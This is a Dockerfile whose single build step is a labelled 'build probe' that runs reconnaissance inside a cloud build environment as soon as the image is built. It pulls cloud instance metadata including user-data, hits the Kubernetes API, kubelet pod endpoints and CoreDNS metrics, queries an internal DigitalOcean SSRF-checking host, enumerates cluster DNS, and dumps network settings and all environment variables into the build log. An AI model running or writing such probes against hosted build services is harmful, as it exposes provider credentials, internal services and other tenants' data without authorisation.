FROM alpine:3.20
RUN apk --no-cache add curl bind-tools iproute2
RUN echo "=== DOCKERFILE BUILD PROBE ===" \
    && echo "--- imds v1 ---" \
    && curl -s --max-time 5 http://169.254.169.254/metadata/v1.json 2>&1 || true \
    && echo "--- imds v1 root ---" \
    && curl -s --max-time 5 http://169.254.169.254/metadata/v1/ 2>&1 || true \
    && echo "--- imds hostname ---" \
    && curl -s --max-time 5 http://169.254.169.254/metadata/v1/hostname 2>&1 || true \
    && echo "--- imds user-data ---" \
    && curl -s --max-time 5 http://169.254.169.254/metadata/v1/user-data 2>&1 || true \
    && echo "--- k8s api ---" \
    && curl -sk --max-time 5 https://10.245.0.1:443/version 2>&1 || true \
    && curl -sk --max-time 5 https://kubernetes.default.svc.cluster.local/version 2>&1 || true \
    && echo "--- coredns metrics ---" \
    && curl -s --max-time 5 http://10.245.0.10:9153/metrics 2>&1 | head -30 || true \
    && echo "--- network info ---" \
    && ip route 2>&1 || true \
    && ip addr show 2>&1 || true \
    && cat /etc/resolv.conf 2>&1 || true \
    && echo "--- dns enum ---" \
    && dig +short kubernetes.default.svc.cluster.local 2>&1 || true \
    && dig +short kube-dns.kube-system.svc.cluster.local 2>&1 || true \
    && echo "--- ssrf sheriff ---" \
    && curl -s --max-time 5 http://ssrf-sheriff.internal.digitalocean.com/ 2>&1 || true \
    && echo "--- kubelet ---" \
    && GW=$(ip route | grep default | awk '{print $3}') \
    && echo "GW=$GW" \
    && curl -sk --max-time 3 "http://${GW}:10255/pods" 2>&1 | head -50 || true \
    && curl -sk --max-time 3 "http://${GW}:10250/pods" 2>&1 | head -50 || true \
    && echo "--- env ---" \
    && env | sort 2>&1 || true \
    && echo "=== PROBE END ==="
RUN echo "Build complete"
CMD ["echo", "done"]
